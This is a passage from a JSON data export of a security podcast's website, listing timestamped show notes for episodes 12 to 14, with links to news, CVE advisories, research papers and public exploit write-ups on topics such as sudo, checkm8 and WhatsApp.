Twitch <a href=\"https://twitch.tv/dayzerosec\">(@Dayzerosec)</a></p>\n<p>[<a href=\"https://www.youtube.com/watch?v=zNWNCtzWI9I&amp;t=00h01m29s\">00:01:29</a>] Sudo: CVE-2019-14287</p>\n<ul>\n<li><a href=\"https://www.openwall.com/lists/oss-security/2019/10/14/1\">https://www.openwall.com/lists/oss-security/2019/10/14/1</a></li>\n</ul>\n<p>[<a href=\"https://www.youtube.com/watch?v=zNWNCtzWI9I&amp;t=00h08m40s\">00:08:40</a>] Buffer overflow in Realtek Wi-Fi chips</p>\n<ul>\n<li><a href=\"https://arstechnica.com/information-technology/2019/10/unpatched-linux-flaw-may-let-attackers-crash-or-compromise-nearby-devices/\">https://arstechnica.com/information-technology/2019/10/unpatched-linux-flaw-may-let-attackers-crash-or-compromise-nearby-devices/</a></li>\n</ul>\n<p>[<a href=\"https://www.youtube.com/watch?v=zNWNCtzWI9I&amp;t=00h17m13s\">00:17:13</a>] US Law Enforcement Traces Bitcoin Transfers to Nab â€˜Largestâ€™ Child Porn Site</p>\n<ul>\n<li><a href=\"https://www.coindesk.com/us-law-enforcement-traces-bitcoin-transactions-to-nab-largest-child-porn-site\">https://www.coindesk.com/us-law-enforcement-traces-bitcoin-transactions-to-nab-largest-child-porn-site</a></li>\n</ul>\n<p>[<a href=\"https://www.youtube.com/watch?v=zNWNCtzWI9I&amp;t=00h39m45s\">00:39:45</a>] Equifax Using admin:admin as Credentials for Sensitive Information</p>\n<ul>\n<li><a href=\"https://twitter.com/JaneLytv/status/1185234246471958528/photo/1\">https://twitter.com/JaneLytv/status/1185234246471958528/photo/1</a></li>\n</ul>\n<p>[<a href=\"https://www.youtube.com/watch?v=zNWNCtzWI9I&amp;t=00h48m40s\">00:48:40</a>] CenturyLink Data Leak of 2.8 Million Records</p>\n<ul>\n<li><a href=\"https://www.comparitech.com/blog/information-security/centurylink-data-leak/\">https://www.comparitech.com/blog/information-security/centurylink-data-leak/</a></li>\n</ul>\n<p>[<a href=\"https://www.youtube.com/watch?v=zNWNCtzWI9I&amp;t=00h56m37s\">00:56:37</a>] NordVPN Reportedly Compromised</p>\n<ul>\n<li><a href=\"https://twitter.com/hexdefined/status/1185864801261477891\">https://twitter.com/hexdefined/status/1185864801261477891</a></li>\n<li><a href=\"https://crt.sh/?q=nordvpn.com\">https://crt.sh/?q=nordvpn.com</a></li>\n<li><a href=\"https://twitter.com/hexdefined/status/1185974575214940161\">https://twitter.com/hexdefined/status/1185974575214940161</a></li>\n<li><a href=\"https://nordvpn.com/\">https://nordvpn.com/</a></li>\n<li><a href=\"https://thatoneprivacysite.net/\">https://thatoneprivacysite.net/</a></li>\n</ul>\n<p>[<a href=\"https://www.youtube.com/watch?v=zNWNCtzWI9I&amp;t=01h07m45s\">01:07:45</a>] Pop_OS 19.10</p>\n<ul>\n<li><a href=\"https://system76.com/pop\">https://system76.com/pop</a></li>\n</ul>\n<p>[<a href=\"https://www.youtube.com/watch?v=zNWNCtzWI9I&amp;t=01h13m26s\">01:13:26</a>] JSFuzz</p>\n<ul>\n<li><a href=\"https://github.com/fuzzitdev/jsfuzz\">https://github.com/fuzzitdev/jsfuzz</a></li>\n</ul>\n<p>[<a href=\"https://www.youtube.com/watch?v=zNWNCtzWI9I&amp;t=01h19m08s\">01:19:08</a>] Site Isolation improvement (and now on Android)</p>\n<ul>\n<li><a href=\"https://blog.chromium.org/2019/10/recent-site-isolation-improvements.html\">https://blog.chromium.org/2019/10/recent-site-isolation-improvements.html</a></li>\n</ul>\n<p>[<a href=\"https://www.youtube.com/watch?v=zNWNCtzWI9I&amp;t=01h22m54s\">01:22:54</a>] A New Memory Type Against Speculative Side Channel Attacks</p>\n<ul>\n<li><a href=\"https://github.com/intelstormteam/Papers/raw/master/2019-A_New_Memory_Type_Against_Speculative_Side_Channel_Attacks.pdf\">https://github.com/intelstormteam/Papers/raw/master/2019-A_New_Memory_Type_Against_Speculative_Side_Channel_Attacks.pdf</a></li>\n</ul>\n<p>[<a href=\"https://www.youtube.com/watch?v=zNWNCtzWI9I&amp;t=01h30m06s\">01:30:06</a>] oo7: Low-overhead Defense against Spectre Attacks via Program Analysis</p>\n<ul>\n<li><a href=\"https://arxiv.org/abs/1807.05843\">https://arxiv.org/abs/1807.05843</a></li>\n</ul>\n<p>[<a href=\"https://www.youtube.com/watch?v=zNWNCtzWI9I&amp;t=01h38m37s\">01:38:37</a>] UK Government to fund development of attack resistant Arm chips</p>\n<ul>\n<li><a href=\"https://www.gov.uk/government/news/confronting-cyber-threats-to-businesses-and-personal-data\">https://www.gov.uk/government/news/confronting-cyber-threats-to-businesses-and-personal-data</a></li>\n</ul>\n<p>[<a href=\"https://www.youtube.com/watch?v=zNWNCtzWI9I&amp;t=01h46m59s\">01:46:59</a>] Germany's Cyber Security Agency Recommends Firefox as Most Secure Browser</p>\n<ul>\n<li><a href=\"https://www.zdnet.com/article/germanys-cyber-security-agency-recommends-firefox-as-most-secure-browser/\">https://www.zdnet.com/article/germanys-cyber-security-agency-recommends-firefox-as-most-secure-browser/</a></li>\n</ul>\n<p>[<a href=\"https://www.youtube.com/watch?v=zNWNCtzWI9I&amp;t=02h01m36s\">02:01:36</a>] Facebook Expanding Bug Bountry Program to Third-Party Apps</p>\n<ul>\n<li><a href=\"https://www.facebook.com/notes/facebook-bug-bounty/expanding-bug-bounty-program-for-third-party-apps/2952152714798935/\">https://www.facebook.com/notes/facebook-bug-bounty/expanding-bug-bounty-program-for-third-party-apps/2952152714798935/</a></li>\n<li><a href=\"https://www.facebook.com/whitehat/info/\">https://www.facebook.com/whitehat/info/</a></li>\n</ul>\n<p>[<a href=\"https://www.youtube.com/watch?v=zNWNCtzWI9I&amp;t=02h04m14s\">02:04:14</a>] ElectionGuard SDK Bug Bounty</p>\n<ul>\n<li><a href=\"https://msrc-blog.microsoft.com/2019/10/18/introducing-the-electionguard-bounty-program/\">https://msrc-blog.microsoft.com/2019/10/18/introducing-the-electionguard-bounty-program/</a></li>\n<li><a href=\"https://www.youtube.com/watch?v=w3_0x6oaDmI\">https://www.youtube.com/watch?v=w3_0x6oaDmI</a></li>\n<li><a href=\"https://www.youtube.com/watch?v=BYRTvoZ3Rho\">https://www.youtube.com/watch?v=BYRTvoZ3Rho</a></li>\n<li><a href=\"https://www.microsoft.com/en-us/msrc/bounty-electionguard\">https://www.microsoft.com/en-us/msrc/bounty-electionguard</a></li>\n</ul>\n<!--kg-card-end: markdown-->","slug":"episode-14-linux-exploits-secure-credentials-side-channels-and-election-sdk-hacking"}},{"node":{"title":"Episode 13 - When your errors have errors...","path":"/posts/episode-13-when-your-errors-have-errors/","date":"14 October 2019","description":"   ","content":"<figure class=\"kg-card kg-embed-card\"><iframe width=\"480\" height=\"270\" src=\"https://www.youtube.com/embed/eAyJ-1IquG8?feature=oembed\" frameborder=\"0\" allow=\"accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen></iframe></figure><!--kg-card-begin: markdown--><p>Watch the podcast live every Monday afternoon at 12:00pm PST (3:00pm EST) on Twitch <a href=\"https://twitch.tv/dayzerosec\">(@Dayzerosec)</a></p>\n<p>[<a href=\"https://www.youtube.com/watch?v=eAyJ-1IquG8&amp;t=00h03m00s\">00:03:00</a>] Critical Security Issue identified in iTerm2 as part of Mozilla Open Source Audit</p>\n<ul>\n<li><a href=\"https://blog.mozilla.org/security/2019/10/09/iterm2-critical-issue-moss-audit/\">https://blog.mozilla.org/security/2019/10/09/iterm2-critical-issue-moss-audit/</a></li>\n<li><a href=\"https://github.com/gnachman/iTerm2/commit/538d570ea54614d3a2b5724f820953d717fbeb0c\">https://github.com/gnachman/iTerm2/commit/538d570ea54614d3a2b5724f820953d717fbeb0c</a></li>\n</ul>\n<p>[<a href=\"https://www.youtube.com/watch?v=eAyJ-1IquG8&amp;t=00h11m24s\">00:11:24</a>] Windows Error Reporting Manager arbitrary file move Elevation of Privilege (CVE-2019-1315)</p>\n<ul>\n<li><a href=\"https://offsec.almond.consulting/windows-error-reporting-arbitrary-file-move-eop.html\">https://offsec.almond.consulting/windows-error-reporting-arbitrary-file-move-eop.html</a></li>\n<li><a href=\"https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf\">https://infocon.org/cons/SyScan/SyScan 2015 Singapore/SyScan 2015 Singapore presentations/SyScan15 James Forshaw - A Link to the Past.pdf</a></li>\n</ul>\n<p>[<a href=\"https://www.youtube.com/watch?v=eAyJ-1IquG8&amp;t=00h16m12s\">00:16:12</a>] CVE-2019-8697: MacOS System Escalation via Disk Management</p>\n<ul>\n<li><a href=\"https://www.zerodayinitiative.com/blog/2019/10/3/cve-2019-8697-macos-system-escalation-via-disk-management\">https://www.zerodayinitiative.com/blog/2019/10/3/cve-2019-8697-macos-system-escalation-via-disk-management</a></li>\n</ul>\n<p>[<a href=\"https://www.youtube.com/watch?v=eAyJ-1IquG8&amp;t=00h20m20s\">00:20:20</a>] Apple Zero Day Exploited in Bitpaymer Campaign</p>\n<ul>\n<li><a href=\"https://blog.morphisec.com/apple-zero-day-exploited-in-bitpaymer-campaign\">https://blog.morphisec.com/apple-zero-day-exploited-in-bitpaymer-campaign</a></li>\n</ul>\n<p>[<a href=\"https://www.youtube.com/watch?v=eAyJ-1IquG8&amp;t=00h25m50s\">00:25:50</a>] BrokenStrokes: On the (in)Security of Wireless Keyboards</p>\n<ul>\n<li><a href=\"https://arxiv.org/abs/1910.03895\">https://arxiv.org/abs/1910.03895</a></li>\n</ul>\n<p>[<a href=\"https://www.youtube.com/watch?v=eAyJ-1IquG8&amp;t=00h31m53s\">00:31:53</a>] PS2 Yabasic Exploit</p>\n<ul>\n<li><a href=\"https://github.com/CTurt/PS2-Yabasic-Exploit\">https://github.com/CTurt/PS2-Yabasic-Exploit</a></li>\n<li><a href=\"http://cturt.github.io/ps2-yabasic.html\">http://cturt.github.io/ps2-yabasic.html</a></li>\n</ul>\n<p>[<a href=\"https://www.youtube.com/watch?v=eAyJ-1IquG8&amp;t=00h40m12s\">00:40:12</a>] Imperva Breach Report</p>\n<ul>\n<li><a href=\"https://www.imperva.com/blog/ceoblog/\">https://www.imperva.com/blog/ceoblog/</a></li>\n</ul>\n<p>[<a href=\"https://www.youtube.com/watch?v=eAyJ-1IquG8&amp;t=00h49m23s\">00:49:23</a>] EU-coordinated risk assessment of 5G network security</p>\n<ul>\n<li><a href=\"https://eeas.europa.eu/delegations/united-states-america/68637/eu-coordinated-risk-assessment-5g-network-security_me\">https://eeas.europa.eu/delegations/united-states-america/68637/eu-coordinated-risk-assessment-5g-network-security_me</a></li>\n</ul>\n<p>[<a href=\"https://www.youtube.com/watch?v=eAyJ-1IquG8&amp;t=00h55m11s\">00:55:11</a>] Measuring Attack Surface Reduction in the Presence of Code (Re-)Randomization</p>\n<ul>\n<li><a href=\"https://arxiv.org/abs/1910.03034\">https://arxiv.org/abs/1910.03034</a></li>\n</ul>\n<p>[<a href=\"https://www.youtube.com/watch?v=eAyJ-1IquG8&amp;t=01h04m46s\">01:04:46</a>] Finding Security Threats That Matter: An Industrial Case Study</p>\n<ul>\n<li><a href=\"https://arxiv.org/abs/1910.03422\">https://arxiv.org/abs/1910.03422</a></li>\n</ul>\n<p>[<a href=\"https://www.youtube.com/watch?v=eAyJ-1IquG8&amp;t=01h16m47s\">01:16:47</a>] An Extended Survey on Vehicle Security</p>\n<ul>\n<li><a href=\"https://arxiv.org/abs/1910.04150\">https://arxiv.org/abs/1910.04150</a></li>\n</ul>\n<p>[<a href=\"https://www.youtube.com/watch?v=eAyJ-1IquG8&amp;t=01h21m56s\">01:21:56</a>] Zydis 3.0 Released (x86-64 disassembler library)</p>\n<ul>\n<li><a href=\"https://github.com/zyantific/zydis\">https://github.com/zyantific/zydis</a></li>\n</ul>\n<p>[<a href=\"https://www.youtube.com/watch?v=eAyJ-1IquG8&amp;t=01h25m54s\">01:25:54</a>] IDA 7.4</p>\n<ul>\n<li><a href=\"https://hex-rays.com/products/ida/7.4/index.shtml\">https://hex-rays.com/products/ida/7.4/index.shtml</a></li>\n</ul>\n<p>[<a href=\"https://www.youtube.com/watch?v=eAyJ-1IquG8&amp;t=01h28m38s\">01:28:38</a>] Government interference in Australia's premier cybersecurity conference is a worry</p>\n<ul>\n<li><a href=\"https://www.zdnet.com/article/government-interference-in-australias-premier-cybersecurity-conference-is-a-worry/\">https://www.zdnet.com/article/government-interference-in-australias-premier-cybersecurity-conference-is-a-worry/</a></li>\n</ul>\n<p>[<a href=\"https://www.youtube.com/watch?v=eAyJ-1IquG8&amp;t=01h33m16s\">01:33:16</a>] uBlock dev build rejected</p>\n<ul>\n<li><a href=\"https://github.com/uBlockOrigin/uBlock-issues/issues/745\">https://github.com/uBlockOrigin/uBlock-issues/issues/745</a></li>\n</ul>\n<p>[<a href=\"https://www.youtube.com/watch?v=eAyJ-1IquG8&amp;t=01h39m19s\">01:39:19</a>] Ken Thompson's Unix Password</p>\n<ul>\n<li><a href=\"https://leahneukirchen.org/blog/archive/2019/10/ken-thompson-s-unix-password.html\">https://leahneukirchen.org/blog/archive/2019/10/ken-thompson-s-unix-password.html</a></li>\n</ul>\n<p>[<a href=\"https://www.youtube.com/watch?v=eAyJ-1IquG8&amp;t=01h44m04s\">01:44:04</a>] Humble Bundle - Linux and Unix O'Reilly Books</p>\n<ul>\n<li><a href=\"https://www.humblebundle.com/books/linux-unix-oreilly-books\">https://www.humblebundle.com/books/linux-unix-oreilly-books</a></li>\n</ul>\n<!--kg-card-end: markdown-->","slug":"episode-13-when-your-errors-have-errors"}},{"node":{"title":"Episode 12 - Exploits-galore iOS (checkm8), Android, Signal, Whatsapp, PHP and more","path":"/posts/episode-12-exploits-galore-ios-checkm8-android-signal-whatsapp-php-and-more/","date":"7 October 2019","description":"   ","content":"<figure class=\"kg-card kg-embed-card\"><iframe width=\"480\" height=\"270\" src=\"https://www.youtube.com/embed/GQfpIYdAwA8?feature=oembed\" frameborder=\"0\" allow=\"accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen></iframe></figure><!--kg-card-begin: markdown--><p>Watch the podcast live every Monday afternoon at 12:00pm PST (3:00pm EST) on Twitch <a href=\"https://twitch.tv/dayzerosec\">(@Dayzerosec)</a></p>\n<p>[<a href=\"https://www.youtube.com/watch?v=GQfpIYdAwA8&amp;t=00h00m40s\">00:00:40</a>] What happened while we were gone. ft. Defcon and Blackhat discussion</p>\n<p>[<a href=\"https://www.youtube.com/watch?v=GQfpIYdAwA8&amp;t=00h20m10s\">00:20:10</a>] Checkm8 - iPhone bootROM exploit</p>\n<ul>\n<li><a href=\"https://github.com/axi0mX/ipwndfu/blob/master/checkm8.py\">https://github.com/axi0mX/ipwndfu/blob/master/checkm8.py</a></li>\n</ul>\n<p>[<a href=\"https://www.youtube.com/watch?v=GQfpIYdAwA8&amp;t=00h28m52s\">00:28:52</a>] iPhone A11 debug registers allow full-featured kernel debugging</p>\n<ul>\n<li><a href=\"https://bugs.chromium.org/p/project-zero/issues/detail?id=1900\">https://bugs.chromium.org/p/project-zero/issues/detail?id=1900</a></li>\n</ul>\n<p>[<a href=\"https://www.youtube.com/watch?v=GQfpIYdAwA8&amp;t=00h32m52s\">00:32:52</a>] Android: Use-After-Free in Binder driver</p>\n<ul>\n<li><a href=\"https://bugs.chromium.org/p/project-zero/issues/detail?id=1942\">https://bugs.chromium.org/p/project-zero/issues/detail?id=1942</a></li>\n<li><a href=\"https://groups.google.com/forum/#!msg/syzkaller-bugs/QyXdgUhAF50/g-FXVo1OAwAJ\">https://groups.google.com/forum/#!msg/syzkaller-bugs/QyXdgUhAF50/g-FXVo1OAwAJ</a></li>\n</ul>\n<p>[<a href=\"https://www.youtube.com/watch?v=GQfpIYdAwA8&amp;t=00h39m36s\">00:39:36</a>] PHP 7.0-7.3 disable_functions bypass</p>\n<ul>\n<li><a href=\"https://github.com/mm0r1/exploits/tree/master/php7-gc-bypass\">https://github.com/mm0r1/exploits/tree/master/php7-gc-bypass</a></li>\n<li><a href=\"https://bugs.php.net/bug.php?id=72530\">https://bugs.php.net/bug.php?id=72530</a></li>\n</ul>\n<p>[<a href=\"https://www.youtube.com/watch?v=GQfpIYdAwA8&amp;t=00h51m49s\">00:51:49</a>] An Empirical Study of C++ Vulnerabilities in Crowd-Sourced Code Examples</p>\n<ul>\n<li><a href=\"https://arxiv.org/abs/1910.01321\">https://arxiv.org/abs/1910.01321</a></li>\n<li><a href=\"https://cwe.mitre.org/data/definitions/20.html\">https://cwe.mitre.org/data/definitions/20.html</a></li>\n</ul>\n<p>[<a href=\"https://www.youtube.com/watch?v=GQfpIYdAwA8&amp;t=01h03m18s\">01:03:18</a>] Signal RTP is processed before call is answered</p>\n<ul>\n<li><a href=\"https://bugs.chromium.org/p/project-zero/issues/detail?id=1936\">https://bugs.chromium.org/p/project-zero/issues/detail?id=1936</a></li>\n<li><a href=\"https://bugs.chromium.org/p/project-zero/issues/detail?id=1943\">https://bugs.chromium.org/p/project-zero/issues/detail?id=1943</a></li>\n</ul>\n<p>[<a href=\"https://www.youtube.com/watch?v=GQfpIYdAwA8&amp;t=01h08m47s\">01:08:47</a>] Whatsapp RCE</p>\n<ul>\n<li><a href=\"https://awakened1712.github.io/hacking/hacking-whatsapp-gif-rce/\">https://awakened1712.github.io/hacking/hacking-whatsapp-gif-rce/</a></li>\n</ul>\n<p>[<a href=\"https://www.youtube.com/watch?v=GQfpIYdAwA8&amp;t=01h14m58s\">01:14:58</a>] Attacking CNN-based anti-spoofing face authentication in the physical domain</p>\n<ul>\n<li><a href=\"https://arxiv.org/abs/1910.00327\">https://arxiv.org/abs/1910.00327</a></li>\n</ul>\n<p>[<a href=\"https://www.youtube.com/watch?v=GQfpIYdAwA8&amp;t=01h22m52s\">01:22:52</a>] The Kernel Concurrency Sanitizer (KCSAN)</p>\n<ul>\n<li><a href=\"https://github.com/google/ktsan/\">https://github.com/google/ktsan/</a></li>\n</ul>\n<p>[<a href=\"https://www.youtube.com/watch?v=GQfpIYdAwA8&amp;t=01h30m36s\">01:30:36</a>] Eradicating Attacks on the Internal Network with Internal Network Policy</p>\n<ul>\n<li><a href=\"https://arxiv.org/abs/1910.00975\">https://arxiv.org/abs/1910.00975</a></li>\n</ul>\n<p>[<a href=\"https://www.youtube.com/watch?v=GQfpIYdAwA8&amp;t=01h39m22s\">01:39:22</a>] Analyzing Control Flow Integrity with LLVM-CFI</p>\n<ul>\n<li><a href=\"https://arxiv.org/abs/1910.01485\">https://arxiv.org/abs/1910.01485</a></li>\n</ul>\n<!--kg-card-end: markdown-->","slug":"episode-12-exploits-galore-ios-checkm8-android-signal-whatsapp-php-and-more"}}]}}},"context":{}}